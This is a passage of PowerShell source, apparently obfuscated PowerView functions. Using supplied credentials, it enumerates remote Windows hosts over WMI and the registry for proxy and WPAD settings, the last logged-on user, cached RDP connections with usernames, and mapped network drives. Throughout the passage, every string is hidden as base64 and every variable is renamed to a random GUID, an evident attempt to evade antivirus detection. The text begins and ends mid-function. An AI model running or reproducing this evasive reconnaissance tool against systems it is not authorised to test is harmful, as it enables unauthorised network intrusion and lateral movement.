ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in $ComputerName) {
     
       try {
                ${43b8dc0c32f0440fb33a464b6fbce115} = @
{
                    'List' = $True
                    'Class' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                    'Namespace' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    
'Computername' = ${9c0baec859734fc983ee3c04b4cde8a7}
                 
   'ErrorAction' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwB0AG8AcAA=')))
                }
      
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${43b8dc0c32f0440fb33a464b6fbce115}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                
${80df3823a5384e629d02963f7e81a0e5} = Get-WmiObject 
@43b8dc0c32f0440fb33a464b6fbce115
                
${647da57433db4e15bf0f72731d2eab78} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8Adw
BzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0AC
AAUwBlAHQAdABpAG4AZwBzAA==')))
                
${a177ded840f74c73881a2c7fffdcbbfc} = 2147483649
                
${ced1550ff8ae48f1a348b0449a857c29} = 
${80df3823a5384e629d02963f7e81a0e5}.GetStringValue
(${a177ded840f74c73881a2c7fffdcbbfc}, 
${647da57433db4e15bf0f72731d2eab78}, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AeAB5AFMAZQByAHYAZQByAA==')))).sValue
                
${a08d1834d31b476f9290a506fb03b254} = 
${80df3823a5384e629d02963f7e81a0e5}.GetStringValue
(${a177ded840f74c73881a2c7fffdcbbfc}, 
${647da57433db4e15bf0f72731d2eab78}, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA=')))).sValue
                
${51d824c3da2b4c38b01e1320daaae991} = ''
                if 
(${a08d1834d31b476f9290a506fb03b254} -and 
(${a08d1834d31b476f9290a506fb03b254} -ne '')) {
                    
try {
                        ${51d824c3da2b4c38b01e1320daaae991} = 
(New-Object Net.WebClient).DownloadString
(${a08d1834d31b476f9290a506fb03b254})
                    }
           
         catch {
                        Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAYw
BvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgAEEAdQB0AG8AQwBvAG4AZgBpAGcAVQBSAE
wAIAA6ACAAJAB7AGEAMAA4AGQAMQA4ADMANABkADMAMQBiADQANwA2AGYAOQAyADkAMA
BhADUAMAA2AGYAYgAwADMAYgAyADUANAB9AA==')))
                    }
      
          }
                if (${ced1550ff8ae48f1a348b0449a857c29} 
-or ${a08d1834d31b476f9290a506fb03b254}) {
                    
${6f675a112d04499c838f32bbba9fa15a} = New-Object PSObject
            
        ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))) 
${ced1550ff8ae48f1a348b0449a857c29}
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))) 
${a08d1834d31b476f9290a506fb03b254}
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBwAGEAZAA='))) ${51d824c3da2b4c38b01e1320daaae991}
               
     ${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert
(0, $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwB4AHkAUwBlAHQAdABpAG4AZwBzAA==')
)))
                    ${6f675a112d04499c838f32bbba9fa15a}
           
     }
                else {
                    Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAATgBvACAAcAByAG8AeA
B5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAEMAbwBtAH
AAdQB0AGUAcgBOAGEAbQBlAA==')))
                }
            }
         
   catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAZQ
BuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzAC
AAZgBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAOgAgACQAXwA=')))
   
         }
        }
    }
}
function Get-WMIRegLastLoggedOn {
    
[OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in $ComputerName) {
     
       ${73122e0a92ba46be8f2e82919bf5acce} = 2147483650
            
${43b8dc0c32f0440fb33a464b6fbce115} = @{
                'List' = 
$True
                'Class' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
       
         'Namespace' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
   
             'Computername' = ${9c0baec859734fc983ee3c04b4cde8a7}
    
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            }
      
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${43b8dc0c32f0440fb33a464b6fbce115}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try 
{
                ${05d1e315edfb4092be735e9339c2df41} = Get-WmiObject 
@43b8dc0c32f0440fb33a464b6fbce115
                
${647da57433db4e15bf0f72731d2eab78} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8Adw
BzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAG
MAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
                $Value = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
                
${0bbbce210eb648e39be1cb6877b7ad89} = 
${05d1e315edfb4092be735e9339c2df41}.GetStringValue
(${73122e0a92ba46be8f2e82919bf5acce}, 
${647da57433db4e15bf0f72731d2eab78}, $Value).sValue
                
${5a454a71fecb4e2ab0fe413f4ec25af6} = New-Object PSObject
            
    ${5a454a71fecb4e2ab0fe413f4ec25af6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                
${5a454a71fecb4e2ab0fe413f4ec25af6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) 
${0bbbce210eb648e39be1cb6877b7ad89}
                
${5a454a71fecb4e2ab0fe413f4ec25af6}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQ
ByAA=='))))
                ${5a454a71fecb4e2ab0fe413f4ec25af6}
       
     }
            catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAF0AIA
BFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAH
MAdAByAHkAIABvAG4AIAAkAHsAOQBjADAAYgBhAGUAYwA4ADUAOQA3ADMANABmAGMAOQ
A4ADMAZQBlADMAYwAwADQAYgA0AGMAZABlADgAYQA3AH0ALgAgAFIAZQBtAG8AdABlAC
AAcgBlAGcAaQBzAHQAcgB5ACAAbABpAGsAZQBsAHkAIABuAG8AdAAgAGUAbgBhAGIAbA
BlAGQALgA=')))
            }
        }
    }
}
function Get-
WMIRegCachedRDPConnection {
    [OutputType
('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
    
    [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in $ComputerName) {
     
       ${3368043cacbd4cb69d7aefa9f41c231b} = 2147483651
            
${43b8dc0c32f0440fb33a464b6fbce115} = @{
                'List' = 
$True
                'Class' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
       
         'Namespace' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
   
             'Computername' = ${9c0baec859734fc983ee3c04b4cde8a7}
    
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
          
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${43b8dc0c32f0440fb33a464b6fbce115}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try 
{
                ${05d1e315edfb4092be735e9339c2df41} = Get-WmiObject 
@43b8dc0c32f0440fb33a464b6fbce115
                
${455c447dc9b94fbe8532d0ebee94a375} = 
(${05d1e315edfb4092be735e9339c2df41}.EnumKey
(${3368043cacbd4cb69d7aefa9f41c231b}, '')).sNames | Where-Object { 
$_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMA
AtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach 
(${d5812c4f76f449a783cad938980602b1} in 
${455c447dc9b94fbe8532d0ebee94a375}) {
                    try {
      
                  if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            
${e0e6b6d01ca04c90bf52fb20f9e41317} = ConvertFrom-SID -ObjectSid 
${d5812c4f76f449a783cad938980602b1} -Credential $Credential
          
              }
                        else {
                        
    ${e0e6b6d01ca04c90bf52fb20f9e41317} = ConvertFrom-SID -ObjectSid 
${d5812c4f76f449a783cad938980602b1}
                        }
         
               ${79bb2be3b49d4a1991e6a30535a7a2e2} = 
${05d1e315edfb4092be735e9339c2df41}.EnumValues
(${3368043cacbd4cb69d7aefa9f41c231b},
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAH
MAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbg
B0AFwARABlAGYAYQB1AGwAdAA=')))).sNames
                        
ForEach (${61110796f0884c28ad047bddd02848c1} in 
${79bb2be3b49d4a1991e6a30535a7a2e2}) {
                            if 
(${61110796f0884c28ad047bddd02848c1} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBSAFUALgAqAA==')))) {
                                
${ed8b73dd209e4c5a9e802152fbeccb21} = 
${05d1e315edfb4092be735e9339c2df41}.GetStringValue
(${3368043cacbd4cb69d7aefa9f41c231b}, 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAH
MAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbg
B0AFwARABlAGYAYQB1AGwAdAA='))), 
${61110796f0884c28ad047bddd02848c1}).sValue
                          
      ${d079a0dffa5c4878bd9f8c7fc77c5017} = New-Object PSObject
      
                          ${d079a0dffa5c4878bd9f8c7fc77c5017} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                                
${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) ${e0e6b6d01ca04c90bf52fb20f9e41317}
   
                             ${d079a0dffa5c4878bd9f8c7fc77c5017} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) 
${d5812c4f76f449a783cad938980602b1}
                                
${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) 
${ed8b73dd209e4c5a9e802152fbeccb21}
                                
${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                         
       
${d079a0dffa5c4878bd9f8c7fc77c5017}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYw
B0AGkAbwBuAA=='))))
                                
${d079a0dffa5c4878bd9f8c7fc77c5017}
                            }
     
                   }
                        
${349b0840683247758c95dd4d39b0647f} = 
${05d1e315edfb4092be735e9339c2df41}.EnumKey
(${3368043cacbd4cb69d7aefa9f41c231b},
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAH
MAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbg
B0AFwAUwBlAHIAdgBlAHIAcwA=')))).sNames
                        
ForEach ($Server in ${349b0840683247758c95dd4d39b0647f}) {
           
                 ${a167a831a0324ea09224f56f679ef347} = 
${05d1e315edfb4092be735e9339c2df41}.GetStringValue
(${3368043cacbd4cb69d7aefa9f41c231b}, 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAH
MAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbg
B0AFwAUwBlAHIAdgBlAHIAcwBcACQAUwBlAHIAdgBlAHIA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                       
     ${d079a0dffa5c4878bd9f8c7fc77c5017} = New-Object PSObject
       
                     ${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                            
${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) ${e0e6b6d01ca04c90bf52fb20f9e41317}
   
                         ${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) 
${d5812c4f76f449a783cad938980602b1}
                            
${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                       
     ${d079a0dffa5c4878bd9f8c7fc77c5017} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) 
${a167a831a0324ea09224f56f679ef347}
                            
${d079a0dffa5c4878bd9f8c7fc77c5017}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYw
B0AGkAbwBuAA=='))))
                            
${d079a0dffa5c4878bd9f8c7fc77c5017}
                        }
         
           }
                    catch {
                        
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQ
BjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgA6ACAAJABfAA==')))
                   
 }
                }
            }
            catch {
                
Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQ
BjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJAB7AD
kAYwAwAGIAYQBlAGMAOAA1ADkANwAzADQAZgBjADkAOAAzAGUAZQAzAGMAMAA0AGIANA
BjAGQAZQA4AGEANwB9ACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAG
UAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbA
BsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA6ACAAJABfAA==')))
           
 }
        }
    }
}
function Get-WMIRegMountedDrive {
    [OutputType
('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in $ComputerName) {
     
       ${3368043cacbd4cb69d7aefa9f41c231b} = 2147483651
            
${43b8dc0c32f0440fb33a464b6fbce115} = @{
                'List' = 
$True
                'Class' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
       
         'Namespace' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
   
             'Computername' = ${9c0baec859734fc983ee3c04b4cde8a7}
    
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
          
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${43b8dc0c32f0440fb33a464b6fbce115}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try 
{
                ${05d1e315edfb4092be735e9339c2df41} = Get-WmiObject 
@43b8dc0c32f0440fb33a464b6fbce115
                
${455c447dc9b94fbe8532d0ebee94a375} = 
(${05d1e315edfb4092be735e9339c2df41}.EnumKey
(${3368043cacbd4cb69d7aefa9f41c231b}, '')).sNames | Where-Object { 
$_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMA
AtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach 
(${d5812c4f76f449a783cad938980602b1} in 
${455c447dc9b94fbe8532d0ebee94a375}) {
                    try {
      
                  if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            
${e0e6b6d01ca04c90bf52fb20f9e41317} = ConvertFrom-SID -ObjectSid 
${d5812c4f76f449a783cad938980602b1} -Credential $Credential
          
              }
                        else {
                        
    ${e0e6b6d01ca04c90bf52fb20f9e41317} = ConvertFrom-SID -ObjectSid 
${d5812c4f76f449a783cad938980602b1}
                        }
         
               ${60d753a892354483a3c2065c0d625839} = 
(${05d1e315edfb4092be735e9339c2df41}.EnumKey
(${3368043cacbd4cb69d7aefa9f41c231b}, 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwATgBlAHQAdwBvAHIAawA='))))).sNames
      
                  ForEach (${706b647d2829436d989ebb0251b02891} in 
${60d753a892354483a3c2065c0d625839}) {
                            
${288c8e0aed8a4e03acb2c58e6b246c99} = 
${05d1e315edfb4092be735e9339c2df41}.GetStringValue
(${3368043cacbd4cb69d7aefa9f41c231b}, 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwATgBlAHQAdwBvAHIAawBcACQAewA3ADAANgBiAD
YANAA3AGQAMgA4ADIAOQA0ADMANgBkADkAOAA5AGUAYgBiADAAMgA1ADEAYgAwADIAOA
A5ADEAfQA='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))).sValue
                       
     ${6489d26f7d774379a4807b45324e819a} = 
${05d1e315edfb4092be735e9339c2df41}.GetStringValue
(${3368043cacbd4cb69d7aefa9f41c231b}, 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwATgBlAHQAdwBvAHIAawBcACQAewA3ADAANgBiAD
YANAA3AGQAMgA4ADIAOQA0ADMANgBkADkAOAA5AGUAYgBiADAAMgA1ADEAYgAwADIAOA
A5ADEAfQA='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAUABhAHQAaAA=')))).sValue
                           
 ${eb05a74d8308405fb5f1cd75e7cf80a7} = 
${05d1e315edfb4092be735e9339c2df41}.GetStringValue
(${3368043cacbd4cb69d7aefa9f41c231b}, 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7AGQANQA4ADEAMgBjADQAZgA3ADYAZgA0ADQAOQBhADcAOAAzAGMAYQBkADkAMw
A4ADkAOAAwADYAMAAyAGIAMQB9AFwATgBlAHQAdwBvAHIAawBcACQAewA3ADAANgBiAD
YANAA3AGQAMgA4ADIAOQA0ADMANgBkADkAOAA5AGUAYgBiADAAMgA1ADEAYgAwADIAOA
A5ADEAfQA='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))).sValue
   
                         if (-not 
${e0e6b6d01ca04c90bf52fb20f9e41317}) { 
${e0e6b6d01ca04c90bf52fb20f9e41317} = '' }
                           
 if (${6489d26f7d774379a4807b45324e819a} -and 
(${6489d26f7d774379a4807b45324e819a} -ne '')) {
                      
          ${87f46d7401784ae9afd2798bc2a16c71} = New-Object PSObject
  
                              ${87f46d7401784ae9afd2798bc2a16c71} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                                
${87f46d7401784ae9afd2798bc2a16c71} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) ${e0e6b6d01ca04c90bf52fb20f9e41317}
   
                             ${87f46d7401784ae9afd2798bc2a16c71} | 
Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) 
${d5812c4f76f449a783cad938980602b1}
                                
${87f46d7401784ae9afd2798bc2a16c71} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RAByAGkAdgBlAEwAZQB0AHQAZQByAA=='))) 
${706b647d2829436d989ebb0251b02891}
                                
${87f46d7401784ae9afd2798bc2a16c71} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA'))) 
${288c8e0aed8a4e03acb2c58e6b246c99}
                                
${87f46d7401784ae9afd2798bc2a16c71} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAUABhAHQAaAA='))) 
${6489d26f7d774379a4807b45324e819a}
                                
${87f46d7401784ae9afd2798bc2a16c71} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RAByAGkAdgBlAFUAcwBlAHIATgBhAG0AZQA='))) 
${eb05a74d8308405fb5f1cd75e7cf80a7}
                                
${87f46d7401784ae9afd2798bc2a16c71}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBNAG8AdQBuAHQAZQBkAEQAcgBpAHYAZQ
A='))))
                                
${87f46d7401784ae9afd2798bc2a16c71}
                            }
     
                   }
                    }
                    catch 
{
                        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
